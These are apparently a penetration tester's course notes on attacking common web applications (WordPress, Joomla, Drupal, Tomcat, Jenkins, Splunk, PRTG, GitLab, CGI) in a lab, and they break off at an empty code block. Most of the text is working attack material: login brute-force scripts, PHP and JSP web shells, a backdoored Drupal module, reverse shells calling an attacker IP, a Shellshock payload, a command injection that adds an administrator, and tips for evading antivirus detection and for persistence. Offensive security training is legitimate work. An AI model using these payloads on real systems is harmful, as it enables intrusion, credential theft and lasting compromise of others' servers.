***Ensure you add the FQDNs and IP addresses to the `/etc/hosts` file*
```Shell
IP=10.129.42.195
printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Application Discovery & Enumeration

#### Nmap Scan using common web application ports
```Shell
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```
Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`)

#### Installing `eyewitness`
```Shell
apt install eyewitness
```

#### Running `eyewitness` using a file generated by an nmap scan
```Shell
eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>
```
Runs eyewitness using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`)

#### Installing `aquatone`
```Shell
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

```Shell
unzip aquatone_linux_amd64_1.7.0.zip
```

#### Putting `aquatone` in $PATH
```Shell
cp aquatone /usr/local/bin/aquatone
```

#### Using `aquatone` to inspect hosts captured by an nmap scan
```Shell
cat web_discovery.xml | ./aquatone -nmap
```
Concatenates the contents of nmap scan output `(web_discovery.xml`) and pipes it into `aquatone`

## WordPress - Discovery & Enumeration

### Directories/Pages of Interest:
- `/robots.txt`
- `/wp-content/plugins`
- `/wp-content/themes`
- `/wp-admin`
- `/wp-login.php`
- `readme.txt`

#### Enumeration with cURL
```Shell
curl -s http://blog.inlanefreight.local | grep WordPress
```
Can help us confirm that WordPress is in use and footprint the version number, which should be noted

```Shell
curl -s http://blog.inlanefreight.local/ | grep themes
```
Provides information on the theme, which may be vulnerable

```Shell
curl -s http://blog.inlanefreight.local/ | grep plugins
```
Provides information on plugins, which may be vulnerable

#### Enumerating Users
- On login page, entering a valid user results in a different message than an invalid user

### WPScan

#### Install [WPScan](https://wpscan.com/)
```Shell
gem install wpscan
```

#### Obtain an API Token from WPVulnDB
Create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token` parameter

#### Normal enumeration scan against a WordPress website with `WPScan`
```Shell
wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```
The default number of threads used is 5. However, this value can be changed using the `-t` flag.

***LAB Notes:*

WP Sitemap Page is the installed plugin
The version is 1.6.4 and can be found at: `http://blog.inlanefreight.local/wp-content/plugins/wp-sitemap-page/readme.txt`


## Attacking WordPress

### Login Bruteforce

#### Login Bruteforce attack with `wpscan`
```Shell
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`). The `-U` argument takes in a list of users or a file containing user names. This applies to the -P passwords option as well. The -t flag is the number of threads which we can adjust up or down depending.

### Code Execution
Requires administrative access

#### Click on `Select` after selecting the theme and edit an uncommon page such as `404.php` to add a web shell
```Shell
system($_GET[0]);
```
The code above (in PHP, not Shell) should let us execute commands via the `GET` parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents.
![[Pasted image 20230218122835.png]]
Click on `Update File `at the bottom to save. WordPress themes are located at `/wp-content/themes/<theme name>`.

#### Interacting with the webshell using cURL
```Shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

#### Using `wp_admin_shell_upload` in Metasploit to upload a shell and execute it automatically
```Shell
use exploit/unix/webapp/wp_admin_shell_upload

set rhosts blog.inlanefreight.local
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195 
set VHOST blog.inlanefreight.local
```
The Metasploit module uploads the `wCoUuUPfIO.php` file to the `/wp-content/plugins` directory

### Leveraging Known Vulnerabilities

*Note: We can use the [waybackurls] tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.*

#### Vulnerable Plugins - mail-masta
```Shell
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
`include($_GET['pl']);` in source code allows us to include a file without any type of input validation or sanitization

#### Vulnerable Plugins - wpDiscuz
[wp_discuz exploit](https://www.exploit-db.com/exploits/49967)
```Shell
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

#### Using cURL to execute commands using the uploaded web shell (if the above exploit fails)
```Shell
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
The above URL can be found in the output from the `wp_discuz.py` exploit. In this example, we would want to make sure to clean up the `uthsdkbywoxeebg-1629904090.8191.php` file and once again list it as a testing artifact in the appendices of our report.

***LAB Notes:*
1) Used wpscan to find user and crack password
2) Used mail-masta to find the other user at `/bin/bash`
3) Used `wp_discuz.py` to upload a file and cURL to call RCE commands from that scipt


## Joomla - Discovery & Enumeration

### Discovery

#### Using cURL to determine if Joomla is being used on an e-commerce page
```Shell
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

#### Fingerprinting the Joomla version if the `README.txt` file is available
```Shell
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

#### Fingerprinting the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`
```Shell
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```
The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.

### Enumeration

#### Installing `droopescan`
```Shell
python3 -m pip install --upgrade pip
pip3 install droopescan
```

#### Scanning a Joomla web page with `droopescan`
```Shell
droopescan scan joomla --url http://dev.inlanefreight.local/
```

#### Installing JoomlaScan and associated dependencies
```Shell
python2.7 -m pip install urllib3
python2.7 -m pip install certifi
python2.7 -m pip install bs4
```
[joomlascan.py](ttps://raw.githubusercontent.com/drego85/JoomlaScan/master/joomlascan.py)

#### Enumerating a Joomla web page with `joomlascan.py`
```Shell
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```

#### Using [joomla-brute.py](https://raw.githubusercontent.com/ajnik/joomla-bruteforce/master/joomla-brute.py) to brute force the admin login page
```Shell
python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```
User is `admin` by default


## Attacking Joomla

### Abusing Built-In Functionality

#### Log-in to the database
![[Pasted image 20230218155055.png]]

#### Click on the Templates tab
![[Pasted image 20230218155103.png]]

#### Click on a template name and pull up the page source
![[Pasted image 20230218155211.png]]

***Tip: Get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment*

#### Add a PHP one-liner to gain code execution
```Shell
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
![[Pasted image 20230218155337.png]]

#### Click on `Save & Close` at the top and confirm code execution using cURL
```Shell
curl -s http://dev.inlanefreight.local/templates/protostar/error.php/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```
From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network

### Leveraging Known Vulnerabilities

#### Attacking Joomla 3.9.4 CVE-2019-10945 using [joomla_dir_trav.py](https://www.exploit-db.com/exploits/46710)
```Shell
python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```


## Drupal - Discovery & Enumeration

### Discovery
- Header or Footer message "`Powered by Drupal`"
- `CHANGELOG.txt` file
- `README.txt` file
- nodes: URIs are usually of the form `/node/<nodeid>`

#### Using cURL to determine if Drupal is the CMS in use
```Shell
curl -s http://drupal.inlanefreight.local | grep Drupal
```

### Enumeration

#### Enumerating the version number using the `CHANGELOG.txt` file
```Shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

```Shell
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

#### Scanning Drupal using `droopescan`
```Shell
droopescan scan drupal -u http://drupal.inlanefreight.local
```

## Attacking Drupal

### Leveraging the PHP Filter Module

#### In ==older versions of Drupal (before version 8)==, it was possible to log in as an admin and enable the `PHP filter` module
![[Pasted image 20230220114301.png]]

#### Tick the check box next to the module and scroll down to `Save configuration`. Then go to Content --> Add content and create a `Basic page`
![[Pasted image 20230220114445.png]]

#### We can now create a page with a malicious PHP snippet
```Shell
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```
*Name the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during the assessment*

#### Set `Text format` drop-down to `PHP code`
![[Pasted image 20230220114650.png]]
After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`

#### Request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the id command or use cURL on the command line
```Shell
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

#### ==Version 8 onwards== we need to download and install the `PHP Filter` module ourselves
```Shell
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
Ask the client before downloading this

#### Go to `Administration` > `Reports` > `Available updates`
![[Pasted image 20230220115203.png]]
Location may differ based on the Drupal version and may be under the Extend menu.

#### Click on `Browse`, select the file from the directory we downloaded it to, then click `Install`

#### Click on `Content` and create a new basic page. Select `PHP code`from the `Text format` dropdown

### Uploading a Backdoored Module
Modules can be found on the `drupal.org` website

#### For a module like `CAPTCHA`, download the archive and extract its contents
```Shell
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

```Shell
tar xvf captcha-8.x-1.2.tar.gz
```

#### Create a PHP web shell
```Shell
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

#### Create a `.htaccess` file to give ourselves access to the folder
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
This is necessary as Drupal denies direct access to the /modules folder

#### Copy both of these files to the captcha folder and create an archive
```Shell
mv shell.php .htaccess captcha
```

```Shell
tar cvf captcha.tar.gz captcha/
```

#### Click on` Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button. Browse to the backdoored Captcha archive and click `Install`.
![[Pasted image 20230220120048.png]]

#### Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands
```Shell
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

### Leveraging Known Vulnerabilities

Drupalgeddon vulnerabilities:
- [CVE-2014-3704](https://www.exploit-db.com/exploits/34992)
- [CVE-2018-7600](https://www.exploit-db.com/exploits/44448)
- CVE-2018-7602

#### Running `drupalgeddon.py` (CVE-2014-3704)
```Shell
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

#### Log in as an admin and use the previously mentioned process to obtain RCE
![[Pasted image 20230220121239.png]]

***Can also use the `exploit/multi/http/drupal_drupalgeddon`* Metasploit module


#### Running `drupalgeddon2.py` (CVE-2014-3704)
```Shell
python3 drupalgeddon2.py
```
Will ask for the URL and will upload a `hello.txt` file

#### Check cURL to ensure `hello.txt` was uploaded
```Shell
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

#### Modify the script to gain RCE by uploading a malicious PHP file
```Shell
echo  '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
```

#### Replace the `echo` command in the exploit script with a command to write out our malicious PHP script
```Shell
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

#### Run the modified exploit script to upload our malicious PHP file

#### Confirm remote code execution using cURL


#### Drupalgeddon3

#### Log in and obtain a valid session cookie
![[Pasted image 20230220122215.png]]

#### Set up the exploit module in Metasploit
```Shell
use exploit/multi/http/drupal_drupageddon3
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
exploit
```


## Tomcat - Discovery & Enumeration

### Discovery

- Running EyeWitness
- Server header in the HTTP response
	- If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version
![[Pasted image 20230220132415.png]]

#### Detecting a Tomcat server and version through the `/docs` page
```Shell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

*The most important file in a Tomcat server is `WEB-INF/web.xml`*

### Enumeration

#### Searching for `/manager` and `/host-manager` pages with `gobuster`
```Shell
gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

## Attacking Tomcat

***If we can access the `/manager` or` /host-manager` endpoints, we can likely achieve remote code execution on the Tomcat server*

### Tomcat Manager - Login Bruteforce

#### Bruteforce login using the `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module
```Shell
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set stop_on_success true
set rhosts 10.129.201.58
run
```

#### Using Burp Suite or ZAP to proxy traffic and troubleshoot a Metasploit module
```Shell
set PROXIES HTTP:127.0.0.1:8080
```
Can use this if you need to see exactly what an MSF script is doing so you can troubleshoot what's happening or explain what's occuring to your client

#### Python script for brute force login
```Python
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

#### Running the Python script to brute force credentials for Tomcat application
```Shell
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### Tomcat Manager - WAR File Upload

GUI Interface to manage the application is usually located at `/manager/html` by default. Only users assigned the `manager-gui` role are allowed to access.

#### JSP Webshell
```Java
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

#### Downloading the JSP webshell from GitHub
```Shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
```

#### Click on Browse to select the `.war` file and then click on `Deploy`
![[Pasted image 20230221094738.png]]

#### Interacting with the webshell using cURL
```Shell
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

To clean up after ourselves, we can go back to the main Tomcat Manager page and click the `Undeploy` button next to the backups application

#### Using `msfvenom` to create the WAR file
```Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

#### Start a Netcat listener and click on `/backup` to execute the shell
```Shell
nc -lnvp 4443
```

***The `multi/http/tomcat_mgr_upload` Metasploit module can be used to automate the process shown*

#### [Lightweight JPS Cmd Shell](https://raw.githubusercontent.com/SecurityRiskAdvisors/cmd.jsp/master/cmd.jsp)
Modifying the following can lead to a 0/58 detection on virustotal:
```jsp
FileOutputStream(f);stream.write(m);o="Uploaded:
```

to
```jsp
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

### [CVE-2020-1938: Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable

#### nmap scan to determine if the AJP service is running on port 8009
```Shell
nmap -sV -p 8009,8080 app-dev.inlanefreight.local
```

#### Running exploit to read `/web.xml`
```Shell
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```


## Jenkins - Discovery & Enumeration

### Enumeration
Will usually be seen on internal penetration tests
![[Pasted image 20230221110731.png]]

## Attacking Jenkins
Need to obtain access first, then access the `Script Console`. The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime.

### Script Console

Accessed at URL: `http://jenkins.inlanefreight.local:8000/script`

#### Script to run the `id` command
```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```
![[Pasted image 20230221111714.png]]

#### Script to gain a reverse shell
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### Starting a netcat listener
```Shell
nc -lnvp 8443
```

#### Metasploit module for obtaining a reverse shell on Jenkins Server
```Shell
use exploit/multi/http/jenkins_script_console
show targets
set TARGET <target-id>
show options
exploit
```

#### Running commands on a Windows-based Jenkins install
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

#### Java reverse shell to gain command execution on a Windows host
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Swap out `localhost` and the port for our IP address and listener port

### Miscellaneous Vulnerabilities
One recent exploit combines two vulnerabilities, CVE-2018-1999002 and CVE-2019-1003000 to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. This exploit works against Jenkins version 2.137.


## Splunk - Discovery & Enumeration

### Discovery
- Prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems
- Uncommon that it'll be externally facing
- The Splunk web server runs by default on port 8000
- On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page.
- If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

#### Nmap service scan
```Shell
nmap -sV 10.129.201.50
```
Identified the `Splunkd httpd `service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API

### Enumeration
- A common method of gaining remote code execution on a Splunk server is through the use of a scripted input
- Every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system
- A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script
- [SSRF Exploit](https://www.exploit-db.com/exploits/40895)

## Attacking Splunk
https://github.com/0xjpuff/reverse_shell_splunk

#### Create a custom Splunk application
```Shell
tree splunk_shell/
```
The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file

#### Edit the PowerShell script to contain IP and Port, then create a tarball or `.spl` file
```Shell
tar -cvzf updater.tar.gz splunk_shell/
```

#### Choose `Install app from file` and upload the application
![[Pasted image 20230221135829.png]]

#### Before uploading the malicious custom app, start a listener using Netcat or socat
```Shell
nc -lnvp 443
```

#### On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`
![[Pasted image 20230221135947.png]]

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

#### Python script if dealing with a Linux host
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
Create a tarball as seen in the Windows example and upload the script

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.


## PRTG Network Monitor

### Discovery/Footprinting/Enumeration
Can typically be found on common web ports such as 80, 443, or 8080

#### Using nmap to scan for PRTG
```Shell
nmap -sV -p- --open -T4 10.129.201.50
```

The default credentials are `prtgadmin:prtgadmin` and are often unchanged

#### Using cURL to enumerate the version number
```Shell
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```
Version `17.3.33.2830` is vulnerable to CVE-2018-9276 which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor

### CVE-2018-9276 

#### Mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`
![[Pasted image 20230221150716.png]]

#### Click on `Add new notification`
![[Pasted image 20230221150736.png]]

#### - Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`
#### - Under Program File, select `Demo exe notification - outfile.ps1` from the drop-down
#### - Enter a command in the parameter field
####     -- add a new local admin user by entering
```Shell
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
#### - Click `Save`
![[Pasted image 20230221151002.png]]

#### You will be redirected to the `Notifications` page and see the new notification named `pwn` in the list
![[Pasted image 20230221151057.png]]
We could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature

#### Click the `Test` button to run our notification and execute the command to add a local admin user

#### Use `CrackMapExec` to confirm local admin access
```Shell
crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```
We could also try to RDP to the box, access over `WinRM`, or use a tool such as evil-winrm or something from the impacket toolkit such as `wmiexec.py` or `psexec.py`.

***LAB Note:*
- Used the base64 encoded PowerShell reverse shell script from revshells after `test.txt;`


## osTicket

### Discovery

- EyeWitness

### Footprinting

#### User Input, Processing, Solution
- Use social engineering to get the IT staff involved with emails and ticket creation so you can find some emails of users for trying to crack into the app

### Attacking osTicket

If we come across a customer support portal during our assessment and can submit a new ticket, we may be able to obtain a valid company email address.
![[Pasted image 20230221160539.png]]

If the company set up their helpdesk software to correlate ticket numbers with emails, then any email sent to the email we received when registering, `940288@inlanefreight.local`, would show up here. With this setup, if we can find an external portal such as a Wiki, chat service (Slack, Mattermost, Rocket.chat), or a Git repository such as GitLab or Bitbucket, we may be able to use this email to register an account and the help desk support portal to receive a sign-up confirmation email.

#### osTicket - Sensitive Data Exposure

- You may find a password on the portal that can be used to log in to other services and parts of the company.
- Sometimes you can see other tickets that were opened and they may hold usefull information.


## Gitlab - Discovery & Enumeration

- We may find scripts or configuration files that were accidentally committed containing cleartext secrets such as passwords
- We may come across SSH private keys
- We can attempt to use the search function to search for users, passwords, etc
- It is also worth perusing any public repositories for sensitive data and, if the application allows, register an account and look to see if any interesting internal repositories are accessible
- If we can obtain user credentials from our OSINT, we may be able to log in to a GitLab instance
- 2FA is disabled by default

### Discovery
- `/help` has the version number, but you must be logged in to access that page
- [Low risk exploit](https://www.exploit-db.com/exploits/49821)

### Enumeration
- There's not much we can do against GitLab without knowing the version number or being logged in.
- The first thing we should try is browsing to `/explore` and see if there are any public projects.
- Once we are done digging through what is available externally, we should check and see if we can register an account and access additional projects
- Use the registration form to enumerate valid users. If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials that we find from a password dump using a tool such as `Dehashed` as seen in the osTicket section

## Attacking GitLab

#### Username Enumeration
`Bash`:
```Shell
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

`Python`:
```Python
python3 git_user_enum.py
```

#### Python Username Enumeration Script
```Python
#!/usr/bin/python

import threading
import requests
import time

URL = 'http://gitlab.inlanefreight.local:8081/'
valid_users = []

def read_users(file_name):
    with open(file_name) as f:
        users = f.read().splitlines()
    return users

def check(user):
    global valid_users
    url = f'{URL}{user}'
    x = requests.head(url)
    if x.status_code == 200:
        valid_users.append(user)
        print (f'\n\nFound...........{user}\n\n')
    else:
        if x.status_code != 302:
            print (f'\n\nError...........{user}\n\n')
    return 0

users = read_users('/usr/share/SecLists/Usernames/cirt-default-usernames.txt')
for num, user in enumerate(users):
    print(f'checking.... {user:20s}', end='\r')
    while threading.active_count() > 50:
        time.sleep(1)
    exec(f"""th{num} = threading.Thread(target=check, args=(user,))""")
    exec(f'th{num}.start()')
print (valid_users)
```

#### Authenticated RCE against v13.10.2 and earlier
```Shell
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

#### Start a netcat listener
```Shell
nc -lnvp 8443
```
## Attacking Tomcat CGI (CVE-2019-0232)
- Versions 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93 of Tomcat are affected
#### Example URL
```Shell
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```
Here, the action parameter is set to title, indicating that the script should search by book title. The query parameter specifies the search term "the great gatsby."
### Enumeration to identify vulnerable Tomcat CGI
#### Nmap scan
```Shell
nmap -p- -sC -Pn 10.129.204.227 --open 
```
Output:
```
<SNIP>
PORT      STATE SERVICE
<SNIP>
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
<SNIP>
```
Apache Tomcat/9.0.17 running on port 8080 running
#### Finding a CGI script using ffuf to fuzz after the `/cgi`
```Shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```
For .cmd

```Shell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
For .bat
### Exploitation
#### Appending commands in the URL
```Shell
curl http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
#### Examine environment variables
```Shell
curl 'http://10.129.205.30:8080/cgi/welcome.bat?&set' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'
```
Output:
```
<...SNIP...>
PATH_INFO=
<...SNIP...>
```
The PATH variable is unset
#### Enumerate using commands w/ the full binary path w/ URL encoding
```Shell
curl 'http://10.129.205.30:8080/cgi/welcome.bat?&?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1'
```

`http://10.129.205.30:8080/cgi/welcome.bat?&?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`

## Attacking Common Gateway Interface (CGI) Applications - Shellshock
#### [Shellshock Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
#### Enumerate the host to identify endpoints w/ Gobuster
```Shell
 gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
Output: `/access.cgi`
#### cURL the script
```Shell
curl -i http://10.129.204.231/cgi-bin/access.cgi
```
#### Confirm the vulnerability
```Shell
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
#### Exploitation to Reverse Shell Access
```Shell
rlwrap nc -lnvp 7777
```

```Shell
